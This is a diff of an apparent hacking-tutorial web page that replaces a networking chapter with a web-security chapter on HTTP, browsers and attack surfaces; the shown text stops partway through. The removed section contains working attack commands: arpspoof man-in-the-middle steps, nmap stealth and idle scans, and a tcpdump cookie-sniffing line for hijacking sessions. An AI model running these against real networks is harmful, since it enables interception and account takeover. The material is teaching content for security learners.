@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chapter 05: Networking Deep Dive - NullSector</title>
+    <title>Chapter 04: Web Security Fundamentals - NullSector</title>
     <link rel="icon" type="image/svg+xml" href="favicon.svg">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -105,418 +105,1727 @@
     <aside class="sidebar">
         <div class="sidebar-section">
             <div class="sidebar-title">On This Page</div>
-            <a href="#intro" class="sidebar-link">Networking Fundamentals</a>
-            <a href="#osi" class="sidebar-link">OSI Model</a>
-            <a href="#tcpip" class="sidebar-link">TCP/IP Stack</a>
-            <a href="#protocols" class="sidebar-link">Network Protocols</a>
-            <a href="#scanning" class="sidebar-link">Network Scanning</a>
-            <a href="#attacks" class="sidebar-link">Network Attacks</a>
+            <a href="#how-web-works" class="sidebar-link">How the Web Works</a>
+            <a href="#http" class="sidebar-link">HTTP Protocol Deep Dive</a>
+            <a href="#browsers" class="sidebar-link">Browser Security Model</a>
+            <a href="#owasp" class="sidebar-link">OWASP Top 10</a>
+            <a href="#xss" class="sidebar-link">XSS Attacks</a>
+            <a href="#sqli" class="sidebar-link">SQL Injection</a>
+            <a href="#csrf" class="sidebar-link">CSRF Attacks</a>
+            <a href="#tools" class="sidebar-link">Web Hacking Tools</a>
         </div>
         <div class="sidebar-section">
             <div class="sidebar-title">Navigation</div>
-            <a href="hacking-ch06.html" class="sidebar-link">Next: Chapter 06 →</a>
-            <a href="hacking-ch04.html" class="sidebar-link">← Previous: Chapter 04</a>
+            <a href="hacking-ch05.html" class="sidebar-link">Next: Chapter 05 →</a>
+            <a href="hacking-ch03.html" class="sidebar-link">← Previous: Chapter 03</a>
             <a href="roadmap-hacking.html" class="sidebar-link">Back to Roadmap</a>
         </div>
     </aside>
 
     <main class="main">
         <div class="page-header">
-            <div class="chapter-label">Chapter 05</div>
-            <h1 class="page-title">Networking Deep Dive</h1>
-            <p class="page-subtitle">Master the protocols, packets, and infrastructure that power the internet - and learn how hackers exploit every layer.</p>
+            <div class="chapter-label">Chapter 04</div>
+            <h1 class="page-title">Web Security Fundamentals</h1>
+            <p class="page-subtitle">The internet is built on trust - and breaking that trust is what web hacking is all about. Learn how websites work, where they fail, and how attackers exploit those failures.</p>
         </div>
 
-        <section id="intro" class="section">
-            <p>Networking is the foundation of hacking. Every attack travels over a network. Every vulnerability exists because data moves between systems. You can't hack what you don't understand, and you can't understand hacking without understanding networks.</p>
-            
-            <div class="metaphor-box">
-                <h4>📬 Networks Are Like Postal Systems</h4>
-                <p><strong>IP addresses</strong> are like street addresses - they identify destinations.</p>
-                <p style="margin-top: 0.5rem;"><strong>Ports</strong> are like apartment numbers - they identify specific services.</p>
-                <p style="margin-top: 0.5rem;"><strong>Packets</strong> are like letters - they carry data from source to destination.</p>
-                <p style="margin-top: 0.5rem;"><strong>Protocols</strong> are like postal service rules - they define how communication works.</p>
+        <section class="section">
+            <p>Web applications are the most common target for hackers today. Why? Because EVERYTHING is on the web - banking, healthcare, government, shopping, social media. Over 80% of all cyberattacks target web applications. If you can hack the web, you can hack the world.</p>
+            <p>This chapter will teach you how web applications work at a fundamental level, then show you exactly where and how they break. By the end, you'll understand the architecture that powers the modern internet and see it through a hacker's eyes - every feature as a potential vulnerability, every input as an attack vector.</p>
+            <div class="info-box">
+                <h4>Career Reality Check</h4>
+                <p>Over 70% of penetration testing jobs focus on web applications. Companies like Google, Facebook, Microsoft, and countless others pay bug bounties ranging from $500 to $100,000+ for web vulnerabilities. Master web security and you'll never be without work - or income.</p>
             </div>
             
-            <div class="info-box">
-                <h4>🎯 Why Networking Matters for Hackers</h4>
-                <p>Network knowledge separates script kiddies from real hackers. Understanding TCP/IP, subnetting, routing, and protocols lets you: find hidden systems, bypass firewalls, intercept traffic, perform man-in-the-middle attacks, and exploit protocol weaknesses.</p>
+            <div class="card-grid" style="margin-top: 2rem;">
+                <div class="card">
+                    <h4>🎯 Why Web Hacking?</h4>
+                    <ul style="margin-top: 1rem; font-size: 0.9rem;">
+                        <li>Every company has a web presence</li>
+                        <li>High reward bug bounties</li>
+                        <li>No physical access needed</li>
+                        <li>Attack from anywhere in the world</li>
+                        <li>Huge attack surface</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>📊 Web Vulnerability Stats</h4>
+                    <ul style="margin-top: 1rem; font-size: 0.9rem;">
+                        <li>Injection: #3 OWASP Top 10</li>
+                        <li>Broken Access Control: #1</li>
+                        <li>XSS: Still incredibly common</li>
+                        <li>Average website: 15+ vulnerabilities</li>
+                        <li>Bug bounty avg payout: $3,000+</li>
+                    </ul>
+                </div>
             </div>
         </section>
 
-        <section id="osi" class="section">
-            <h2 class="section-title">The OSI Model</h2>
-            <p class="section-intro">The OSI (Open Systems Interconnection) model divides networking into 7 layers. Each layer has specific responsibilities and attack vectors.</p>
+        <section id="how-web-works" class="section">
+            <h2 class="section-title">How the Web Actually Works</h2>
+            <p class="section-intro">Before you can hack websites, you need to understand what happens when you type a URL and press Enter. Most people have no idea - but as a hacker, you'll see the web as a complex dance of protocols, each step a potential opportunity to intercept, modify, or exploit.</p>
+
+            <div class="metaphor-box">
+                <h4>🍕 The Restaurant Metaphor</h4>
+                <p>Imagine the internet as a massive city full of restaurants (websites):</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>Your Browser</strong> = You, the customer walking into a restaurant</li>
+                    <li><strong>DNS</strong> = The phone book (converts "Pizza Place" to an actual street address)</li>
+                    <li><strong>IP Address</strong> = The restaurant's physical street address (192.168.1.1)</li>
+                    <li><strong>Port</strong> = Which door to use (front door = 80, VIP entrance = 443)</li>
+                    <li><strong>HTTP Request</strong> = Your order ("I'll have a pepperoni pizza with extra cheese")</li>
+                    <li><strong>Web Server</strong> = The kitchen that receives and prepares your order</li>
+                    <li><strong>Database</strong> = The pantry where ingredients (data) are stored</li>
+                    <li><strong>HTTP Response</strong> = Your food arriving at the table</li>
+                    <li><strong>Cookies</strong> = Your loyalty card that remembers who you are</li>
+                </ul>
+                <p style="margin-top: 1rem; color: var(--accent);">Hacking is like finding ways to get free food, sneak into the kitchen, read other people's orders, or become the manager without permission!</p>
+            </div>
+
+            <h3>The Complete Journey of a Web Request</h3>
+            <div class="code"># You type: https://bank.com/account
+
+# ==================== STEP 1: URL PARSING ====================
+# Browser breaks down the URL:
+Protocol: https://          (use encryption)
+Domain:   bank.com          (who we're talking to)
+Path:     /account          (what we want)
+Port:     443               (implied by https)
+
+# ==================== STEP 2: DNS RESOLUTION ====================
+# "What's the IP address of bank.com?"
+
+Your Computer → Local DNS Cache (already know it?)
+             → Router DNS Cache (maybe router knows?)
+             → ISP DNS Server (usually knows common sites)
+             → Root DNS Servers (top of the chain)
+             → .com TLD Servers (handles all .com)
+             → bank.com Authoritative Server (final answer!)
+             
+Response: "bank.com is at 203.0.113.50"
+
+# ==================== STEP 3: TCP CONNECTION ====================
+# Your computer connects to 203.0.113.50 on port 443
+
+Three-Way Handshake:
+Your PC  → [SYN]      →  Server    "Hey, want to talk?"
+Your PC  ← [SYN-ACK]  ←  Server    "Sure, I hear you!"
+Your PC  → [ACK]      →  Server    "Great, we're connected!"
+
+# ==================== STEP 4: TLS HANDSHAKE (HTTPS) ====================
+# Establishing encrypted connection
+
+Client Hello:  "I support TLS 1.3, these ciphers..."
+Server Hello:  "Let's use TLS 1.3 with AES-256-GCM"
+Certificate:   "Here's my SSL certificate proving I'm bank.com"
+Verification:  Browser checks certificate against trusted CAs
+Key Exchange:  Both parties derive shared encryption key
+Finished:      All future traffic is encrypted!
+
+# ==================== STEP 5: HTTP REQUEST SENT ====================
+# Now encrypted and sent through the TLS tunnel
+
+GET /account HTTP/1.1
+Host: bank.com
+Cookie: session=abc123def456
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: text/html,application/xhtml+xml
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+# ==================== STEP 6: SERVER PROCESSING ====================
+# The web server receives and processes your request
+
+1. Web Server (Apache/Nginx) receives request
+2. Routes to application (PHP/Python/Node.js/etc.)
+3. Application checks: Is this user logged in?
+   - Looks up session=abc123def456 in database
+   - Finds: User ID 1234, name "John Smith"
+4. Application queries database:
+   - SELECT balance FROM accounts WHERE user_id = 1234
+   - Result: $10,000
+5. Application generates HTML page with your data
+6. Response sent back to browser
+
+# ==================== STEP 7: HTTP RESPONSE ====================
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 12345
+Set-Cookie: tracking=xyz789; SameSite=Lax
+Cache-Control: no-store
+X-Frame-Options: DENY
+Content-Security-Policy: default-src 'self'
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Your Account&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;Welcome, John Smith&lt;/h1&gt;
+  &lt;p&gt;Your balance: $10,000&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+# ==================== STEP 8: BROWSER RENDERING ====================
+
+1. Parse HTML into DOM (Document Object Model)
+2. Parse CSS into CSSOM (CSS Object Model)
+3. Load external resources:
+   - &lt;link href="styles.css"&gt; → Another HTTP request
+   - &lt;script src="app.js"&gt; → Another HTTP request
+   - &lt;img src="logo.png"&gt; → Another HTTP request
+4. Execute JavaScript
+5. Paint pixels to screen
+6. Handle user interactions</div>
+
+            <h3>Every Step is an Attack Surface</h3>
+            <p>Each step in this process can be attacked. Understanding where vulnerabilities exist is the first step to exploiting them:</p>
             
             <div class="card-grid">
                 <div class="card">
-                    <h4>7. Application Layer</h4>
-                    <p>HTTP, FTP, DNS, SMTP - User-facing protocols</p>
-                    <p style="margin-top: 1rem; color: #ff6b6b;"><strong>Attacks:</strong> SQL injection, XSS, command injection, API abuse</p>
+                    <h4>🎯 DNS Attacks</h4>
+                    <p><strong>DNS Poisoning:</strong> Corrupt DNS cache to redirect bank.com to attacker's fake site. Your browser shows "bank.com" but you're on evil.com.</p>
+                    <p style="margin-top: 0.5rem;"><strong>DNS Hijacking:</strong> Compromise DNS server itself to redirect all lookups.</p>
                 </div>
                 <div class="card">
-                    <h4>6. Presentation Layer</h4>
-                    <p>Data formatting, encryption, compression</p>
-                    <p style="margin-top: 1rem; color: #ff6b6b;"><strong>Attacks:</strong> SSL/TLS attacks, encoding exploits</p>
+                    <h4>🔓 Man-in-the-Middle</h4>
+                    <p><strong>Without HTTPS:</strong> Attackers on your network can read and modify ALL traffic. See passwords, inject malware, steal sessions.</p>
+                    <p style="margin-top: 0.5rem;"><strong>With HTTPS:</strong> Still vulnerable if user ignores certificate warnings or if CA is compromised.</p>
                 </div>
                 <div class="card">
-                    <h4>5. Session Layer</h4>
-                    <p>Session management between applications</p>
-                    <p style="margin-top: 1rem; color: #ff6b6b;"><strong>Attacks:</strong> Session hijacking, session fixation</p>
+                    <h4>🍪 Cookie/Session Attacks</h4>
+                    <p><strong>Session Hijacking:</strong> Steal someone's session cookie and you become them. No password needed - you have their authenticated session.</p>
+                    <p style="margin-top: 0.5rem;"><strong>Session Fixation:</strong> Force victim to use a session ID you know.</p>
                 </div>
                 <div class="card">
-                    <h4>4. Transport Layer</h4>
-                    <p>TCP, UDP - Reliable data transfer</p>
-                    <p style="margin-top: 1rem; color: #ff6b6b;"><strong>Attacks:</strong> SYN flood, port scanning, TCP hijacking</p>
+                    <h4>💉 Server-Side Attacks</h4>
+                    <p><strong>Injection:</strong> SQL, Command, LDAP - trick server into executing attacker-controlled code.</p>
+                    <p style="margin-top: 0.5rem;"><strong>Logic Flaws:</strong> Bypass payment, access other users' data, escalate privileges.</p>
                 </div>
                 <div class="card">
-                    <h4>3. Network Layer</h4>
-                    <p>IP, ICMP, routing between networks</p>
-                    <p style="margin-top: 1rem; color: #ff6b6b;"><strong>Attacks:</strong> IP spoofing, routing attacks, ICMP flood</p>
+                    <h4>📱 Client-Side Attacks</h4>
+                    <p><strong>XSS:</strong> Inject JavaScript that runs in victim's browser. Steal cookies, capture keystrokes, perform actions.</p>
+                    <p style="margin-top: 0.5rem;"><strong>CSRF:</strong> Trick victim's browser into making requests they didn't intend.</p>
                 </div>
                 <div class="card">
-                    <h4>2. Data Link Layer</h4>
-                    <p>MAC addressing, switching, frames</p>
-                    <p style="margin-top: 1rem; color: #ff6b6b;"><strong>Attacks:</strong> ARP spoofing, MAC flooding, VLAN hopping</p>
+                    <h4>🔧 Infrastructure Attacks</h4>
+                    <p><strong>Server Vulnerabilities:</strong> Outdated software, misconfigurations, default credentials.</p>
+                    <p style="margin-top: 0.5rem;"><strong>Supply Chain:</strong> Compromise libraries or CDNs that the site depends on.</p>
                 </div>
-                <div class="card">
-                    <h4>1. Physical Layer</h4>
-                    <p>Cables, signals, bits on the wire</p>
-                    <p style="margin-top: 1rem; color: #ff6b6b;"><strong>Attacks:</strong> Wire tapping, jamming, physical access</p>
-                </div>
+            </div>
+
+            <div class="info-box" style="margin-top: 2rem;">
+                <h4>Attack Surface Thinking</h4>
+                <p>Every feature is a potential vulnerability. Every input is an attack vector. Every trust boundary can be crossed. When looking at a web application, ask yourself:</p>
+                <ul style="margin-top: 1rem;">
+                    <li>What data does this accept? Can I inject malicious payloads?</li>
+                    <li>What trust assumptions are being made? Can I violate them?</li>
+                    <li>What happens if I do something unexpected?</li>
+                    <li>How does authentication/authorization work? Can I bypass it?</li>
+                    <li>What happens behind the scenes that I can't see?</li>
+                </ul>
             </div>
         </section>
 
-        <section id="tcpip" class="section">
-            <h2 class="section-title">TCP/IP Protocol Stack</h2>
-            <p class="section-intro">The TCP/IP model is what the internet actually uses - a simpler 4-layer model.</p>
-            
-            <h3>IP Addresses</h3>
-            <p>Every device on a network needs an IP address. Think of it as a phone number for computers.</p>
-            
-            <div class="code">IPv4: 192.168.1.100    (32-bit, 4 billion addresses)
-IPv6: 2001:0db8::1    (128-bit, basically infinite)
+        <section id="http" class="section">
+            <h2 class="section-title">HTTP Protocol Deep Dive</h2>
+            <p class="section-intro">HTTP (HyperText Transfer Protocol) is the language browsers and servers speak. As a web hacker, you need to understand every byte of it - because every byte is a potential attack vector. This is the foundation of all web hacking.</p>
 
-Private IP ranges (not routable on internet):
-10.0.0.0 - 10.255.255.255
-172.16.0.0 - 172.31.255.255
-192.168.0.0 - 192.168.255.255</div>
+            <div class="metaphor-box">
+                <h4>📝 HTTP is Just Text</h4>
+                <p>Despite its importance, HTTP is surprisingly simple - it's just structured text sent over a network connection. No fancy encoding, no binary formats (in HTTP/1.1). You can literally type HTTP requests by hand using netcat or telnet. This simplicity is both its strength and its weakness - it's easy to understand, easy to debug, and easy to manipulate.</p>
+            </div>
 
-            <h3>Ports & Services</h3>
-            <p>Ports identify specific services running on a device. 65,536 possible ports.</p>
-            
+            <h3>HTTP Request Structure</h3>
+            <div class="code"># Every HTTP request has 3 parts: Request Line, Headers, Body
+
+# ==================== THE REQUEST LINE ====================
+POST /login HTTP/1.1
+│    │      │
+│    │      └── Protocol version
+│    └── Path/Resource being requested
+└── HTTP Method (what you're doing)
+
+# ==================== REQUEST HEADERS ====================
+Host: example.com                       # REQUIRED - which site
+Content-Type: application/x-www-form-urlencoded  # Format of body
+Content-Length: 27                      # Size of body in bytes
+Cookie: session=abc123; tracking=xyz    # Session cookies
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: https://example.com/previous-page
+Origin: https://example.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+X-Requested-With: XMLHttpRequest        # Indicates AJAX request
+X-Forwarded-For: 192.168.1.1            # Original client IP (proxied)
+                                        # ← EMPTY LINE separates headers from body
+# ==================== REQUEST BODY ====================
+username=admin&password=secret          # Form data
+
+# The body format depends on Content-Type:
+# application/x-www-form-urlencoded: key=value&key2=value2
+# application/json: {"username": "admin", "password": "secret"}
+# multipart/form-data: For file uploads</div>
+
+            <h3>HTTP Methods - What You're Asking For</h3>
             <table>
-                <tr><th>Port</th><th>Service</th><th>Used For</th></tr>
-                <tr><td>21</td><td>FTP</td><td>File transfer</td></tr>
-                <tr><td>22</td><td>SSH</td><td>Secure remote access</td></tr>
-                <tr><td>80</td><td>HTTP</td><td>Web traffic</td></tr>
-                <tr><td>443</td><td>HTTPS</td><td>Encrypted web</td></tr>
-                <tr><td>3306</td><td>MySQL</td><td>Database</td></tr>
-                <tr><td>3389</td><td>RDP</td><td>Windows remote desktop</td></tr>
+                <thead>
+                    <tr>
+                        <th>Method</th>
+                        <th>Purpose</th>
+                        <th>Hacker Interest</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>GET</strong></td>
+                        <td>Retrieve data</td>
+                        <td>Parameters in URL - visible in logs, history, Referer header. Never use for sensitive data but devs do anyway!</td>
+                    </tr>
+                    <tr>
+                        <td><strong>POST</strong></td>
+                        <td>Submit data</td>
+                        <td>Body can contain injection payloads. Most common method for login, forms, API calls.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>PUT</strong></td>
+                        <td>Update/create resource</td>
+                        <td>Sometimes allows arbitrary file upload! Check if you can PUT files to web root.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>DELETE</strong></td>
+                        <td>Remove resource</td>
+                        <td>Authorization bypass = delete any resource. Test with other users' resources.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>PATCH</strong></td>
+                        <td>Partial update</td>
+                        <td>Often has different validation than PUT. Try mass assignment attacks.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>OPTIONS</strong></td>
+                        <td>Check allowed methods</td>
+                        <td>Reveals what server accepts. Check for dangerous methods like PUT, DELETE, TRACE.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>HEAD</strong></td>
+                        <td>GET without body</td>
+                        <td>Bypass content-based security checks while still seeing headers.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>TRACE</strong></td>
+                        <td>Debug/echo request</td>
+                        <td>Can steal cookies via XSS (Cross-Site Tracing). Usually disabled.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>CONNECT</strong></td>
+                        <td>Tunnel (for proxies)</td>
+                        <td>Can create tunnels through proxy servers. SSRF potential.</td>
+                    </tr>
+                </tbody>
             </table>
 
-            <h3>TCP vs UDP</h3>
-            <div class="card-grid">
-                <div class="card">
-                    <h4>TCP (Transmission Control Protocol)</h4>
-                    <p><strong>Reliable:</strong> Guarantees delivery, orders packets, checks errors</p>
-                    <p style="margin-top: 1rem;"><strong>Use cases:</strong> Web browsing, file transfer, email</p>
-                    <p style="margin-top: 1rem;"><strong>Slower</strong> but accurate</p>
-                </div>
-                <div class="card">
-                    <h4>UDP (User Datagram Protocol)</h4>
-                    <p><strong>Unreliable:</strong> No delivery guarantee, no ordering, no error checking</p>
-                    <p style="margin-top: 1rem;"><strong>Use cases:</strong> Streaming, gaming, DNS, VoIP</p>
-                    <p style="margin-top: 1rem;"><strong>Faster</strong> but may lose data</p>
-                </div>
-            </div>
+            <h3>HTTP Response Structure</h3>
+            <div class="code"># ==================== STATUS LINE ====================
+HTTP/1.1 200 OK
+│        │   │
+│        │   └── Status text (human readable)
+│        └── Status code (machine readable)
+└── Protocol version
 
-            <h3>Three-Way Handshake (TCP Connection)</h3>
-            <div class="code">Client → Server: SYN (Synchronize)
-    "Hey, I want to connect. My sequence number is 1000."
+# ==================== RESPONSE HEADERS ====================
+Date: Mon, 15 Jan 2024 12:00:00 GMT
+Server: Apache/2.4.41 (Ubuntu)          # ← Version disclosure!
+X-Powered-By: PHP/8.0.0                 # ← Technology disclosure!
+Content-Type: text/html; charset=UTF-8
+Content-Length: 1234
+Set-Cookie: session=newvalue; HttpOnly; Secure; SameSite=Strict
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Expires: 0
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Content-Security-Policy: default-src 'self'
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+                                        # ← EMPTY LINE
+# ==================== RESPONSE BODY ====================
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;&lt;title&gt;Example&lt;/title&gt;&lt;/head&gt;
+  &lt;body&gt;Response content here&lt;/body&gt;
+&lt;/html&gt;</div>
 
-Server → Client: SYN-ACK (Synchronize-Acknowledge)
-    "OK! My sequence number is 2000. I got your 1000."
+            <h3>HTTP Status Codes - What They Tell You</h3>
+            <div class="code"># ==================== 1xx - INFORMATIONAL ====================
+100 Continue           # Server received headers, send body
+101 Switching Protocols # WebSocket upgrade
 
-Client → Server: ACK (Acknowledge)
-    "Great! I got your 2000. We're connected!"
+# ==================== 2xx - SUCCESS ====================
+200 OK                 # Request worked!
+201 Created            # Resource created (POST/PUT success)
+204 No Content         # Success but nothing to return
+206 Partial Content    # Range request (video streaming, downloads)
 
-Now data can flow both ways.</div>
+# ==================== 3xx - REDIRECTION ====================
+301 Moved Permanently  # Resource permanently moved, update bookmarks
+302 Found              # Temporary redirect (most common)
+304 Not Modified       # Use cached version
+307 Temporary Redirect # Like 302 but preserves method
+308 Permanent Redirect # Like 301 but preserves method
 
-            <div class="warning-box">
-                <h4>⚠️ Hacker Perspective: SYN Flood Attack</h4>
-                <p>Send thousands of SYN packets but never send the final ACK. The server keeps half-open connections in memory, waiting for ACKs that never come. Eventually the server runs out of resources and crashes - denial of service attack.</p>
-            </div>
-        </section>
+# ==================== 4xx - CLIENT ERRORS ====================
+400 Bad Request        # Malformed request (your syntax is wrong)
+401 Unauthorized       # Need to authenticate (who are you?)
+403 Forbidden          # Authenticated but not allowed (you can't do that)
+404 Not Found          # Resource doesn't exist
+405 Method Not Allowed # Wrong HTTP method for this endpoint
+408 Request Timeout    # Server gave up waiting
+413 Payload Too Large  # Request body too big
+414 URI Too Long       # URL is too long
+429 Too Many Requests  # Rate limited! Slow down
 
-        <section id="protocols" class="section">
-            <h2 class="section-title">Essential Network Protocols</h2>
-            
-            <h3>DNS (Domain Name System)</h3>
-            <p>Translates domain names to IP addresses. Like a phone book for the internet.</p>
-            
-            <div class="code">You type: google.com
-DNS resolves: 172.217.14.206
-Your browser connects to that IP</div>
-
-            <div class="warning-box">
-                <h4>DNS Attacks</h4>
-                <p><strong>DNS Spoofing:</strong> Fake DNS responses redirect users to malicious sites</p>
-                <p style="margin-top: 0.5rem;"><strong>DNS Tunneling:</strong> Hide data inside DNS queries to bypass firewalls</p>
-                <p style="margin-top: 0.5rem;"><strong>DNS Amplification:</strong> DDoS attack using open DNS resolvers</p>
-            </div>
-
-            <h3>ARP (Address Resolution Protocol)</h3>
-            <p>Maps IP addresses to MAC addresses on local networks.</p>
-            
-            <div class="code">Device: "Who has IP 192.168.1.1?"
-Router: "I do! My MAC is AA:BB:CC:DD:EE:FF"</div>
-
-            <div class="warning-box">
-                <h4>ARP Spoofing (Man-in-the-Middle)</h4>
-                <p>Send fake ARP responses claiming you're the router. All traffic flows through you before reaching the real router. You can see and modify everything - passwords, sessions, messages.</p>
-            </div>
-
-            <h3>ICMP (Internet Control Message Protocol)</h3>
-            <p>Used for network diagnostics and error messages. Powers <span class="inline-code">ping</span> command.</p>
-            
-            <div class="code"># Ping checks if a host is alive
-ping 192.168.1.1
-
-# Traceroute shows the path packets take
-traceroute google.com</div>
+# ==================== 5xx - SERVER ERRORS ====================
+500 Internal Server Error   # Server crashed (INTERESTING! Stack traces?)
+501 Not Implemented        # Server doesn't support this method
+502 Bad Gateway            # Backend server failed
+503 Service Unavailable    # Server overloaded/maintenance
+504 Gateway Timeout        # Backend server took too long</div>
 
             <div class="info-box">
-                <h4>ICMP in Hacking</h4>
-                <p>ICMP can reveal network topology, detect firewalls, discover live hosts, and even be used for data exfiltration (ICMP tunneling).</p>
-            </div>
-        </section>
-
-        <section id="scanning" class="section">
-            <h2 class="section-title">Network Scanning & Reconnaissance</h2>
-            <p class="section-intro">Before you attack, you need to know what's there. Scanning discovers hosts, open ports, services, and vulnerabilities.</p>
-            
-            <h3>Host Discovery</h3>
-            <div class="code"># Ping sweep - find live hosts
-nmap -sn 192.168.1.0/24
-
-# ARP scan (local network only)
-arp-scan --localnet
-
-# Detect all devices on network
-netdiscover -r 192.168.1.0/24</div>
-
-            <h3>Port Scanning with Nmap</h3>
-            <p>Nmap is the industry standard for network scanning.</p>
-            
-            <div class="code"># Scan common ports
-nmap 192.168.1.100
-
-# Scan ALL ports (1-65535)
-nmap -p- 192.168.1.100
-
-# Service version detection
-nmap -sV 192.168.1.100
-
-# Operating system detection
-nmap -O 192.168.1.100
-
-# Aggressive scan (OS, version, scripts, traceroute)
-nmap -A 192.168.1.100
-
-# Stealth SYN scan (doesn't complete handshake)
-nmap -sS 192.168.1.100
-
-# UDP scan
-nmap -sU 192.168.1.100</div>
-
-            <h3>Scan Types Explained</h3>
-            <div class="card-grid">
-                <div class="card">
-                    <h4>TCP Connect Scan</h4>
-                    <p>Completes full TCP handshake. <strong>Loud and obvious</strong> but works through any firewall.</p>
-                    <div class="code" style="font-size: 0.8rem;">nmap -sT target</div>
-                </div>
-                <div class="card">
-                    <h4>SYN Scan (Stealth)</h4>
-                    <p>Sends SYN, waits for SYN-ACK, then sends RST instead of ACK. <strong>Stealthier</strong> - doesn't log on many systems.</p>
-                    <div class="code" style="font-size: 0.8rem;">nmap -sS target</div>
-                </div>
-                <div class="card">
-                    <h4>NULL/FIN/XMAS Scans</h4>
-                    <p>Send malformed packets. Open ports ignore them, closed ports send RST. <strong>Bypasses some firewalls.</strong></p>
-                    <div class="code" style="font-size: 0.8rem;">nmap -sN target</div>
-                </div>
-                <div class="card">
-                    <h4>Idle Scan</h4>
-                    <p>Uses a zombie host to scan target. <strong>Ultimate stealth</strong> - target logs show zombie's IP, not yours.</p>
-                    <div class="code" style="font-size: 0.8rem;">nmap -sI zombie target</div>
-                </div>
-            </div>
-
-            <div class="warning-box">
-                <h4>⚠️ Legal Warning</h4>
-                <p><strong>Only scan networks you own or have explicit written permission to test.</strong> Unauthorized network scanning is illegal in most countries and can result in criminal charges. Companies actively monitor for scans and will prosecute.</p>
-            </div>
-        </section>
-
-        <section id="attacks" class="section">
-            <h2 class="section-title">Common Network Attacks</h2>
-            
-            <h3>Man-in-the-Middle (MITM)</h3>
-            <p>Attacker positions themselves between two communicating parties, intercepting and potentially modifying all traffic.</p>
-            
-            <div class="code"># ARP spoofing with arpspoof (educational purposes only)
-# Tell victim you're the router
-arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
-
-# Tell router you're the victim
-arpspoof -i eth0 -t 192.168.1.1 192.168.1.50
-
-# Enable packet forwarding so traffic still works
-echo 1 > /proc/sys/net/ipv4/ip_forward
-
-# Now all traffic flows through you!</div>
-
-            <h3>Denial of Service (DoS)</h3>
-            <p>Overwhelm a target system with traffic until it can't respond to legitimate requests.</p>
-            
-            <div class="card-grid">
-                <div class="card">
-                    <h4>SYN Flood</h4>
-                    <p>Send massive amounts of SYN packets, never complete handshake. Target's connection table fills up.</p>
-                </div>
-                <div class="card">
-                    <h4>UDP Flood</h4>
-                    <p>Spam UDP packets to random ports. Target wastes resources checking each one.</p>
-                </div>
-                <div class="card">
-                    <h4>ICMP Flood</h4>
-                    <p>Send massive ping requests. Old but sometimes effective.</p>
-                </div>
-                <div class="card">
-                    <h4>DDoS (Distributed)</h4>
-                    <p>Same attacks but from thousands of infected computers (botnet). Nearly impossible to stop.</p>
-                </div>
-            </div>
-
-            <h3>Packet Sniffing</h3>
-            <p>Capture and analyze network traffic to extract sensitive information.</p>
-            
-            <div class="code"># Wireshark - GUI packet analyzer (best for learning)
-wireshark
-
-# tcpdump - command-line packet capture
-tcpdump -i eth0 -n
-
-# Capture HTTP traffic
-tcpdump -i eth0 'tcp port 80'
-
-# Capture and save to file
-tcpdump -i eth0 -w capture.pcap
-
-# Read captured file
-tcpdump -r capture.pcap</div>
-
-            <div class="info-box">
-                <h4>What Can You See in Packet Captures?</h4>
+                <h4>Status Code Enumeration</h4>
+                <p>Different response codes reveal valuable information:</p>
                 <ul style="margin-top: 1rem;">
-                    <li>Unencrypted passwords (HTTP, FTP, Telnet)</li>
-                    <li>Email content and attachments</li>
-                    <li>Session cookies</li>
-                    <li>Visited websites</li>
-                    <li>File transfers</li>
-                    <li>DNS queries (what sites users visit)</li>
+                    <li><strong>403 vs 404:</strong> 403 means "I see it but you can't access it" - the resource EXISTS. 404 means "doesn't exist". This reveals valid usernames, files, endpoints.</li>
+                    <li><strong>401 vs 403:</strong> 401 means "authenticate first", 403 means "you're authenticated but still can't". Helps understand auth model.</li>
+                    <li><strong>500 errors:</strong> Often include stack traces, file paths, database errors - goldmine of information!</li>
+                    <li><strong>302 redirects:</strong> Where does it go? Internal URLs, admin panels, debug endpoints?</li>
                 </ul>
-                <p style="margin-top: 1rem;"><strong>This is why HTTPS is critical.</strong> Encrypted traffic shows that communication happened, but not what was said.</p>
             </div>
 
-            <h3>Session Hijacking</h3>
-            <p>Steal an active session by capturing session tokens/cookies.</p>
-            
-            <div class="code"># Capture traffic to find session cookies
-tcpdump -i eth0 -A | grep "Cookie:"
+            <h3>Critical HTTP Headers for Hackers</h3>
+            <div class="code"># ==================== SECURITY HEADERS (look for missing ones!) ====================
 
-# Use stolen cookie to impersonate user
-# Copy cookie value into your browser
-# You're now logged in as the victim</div>
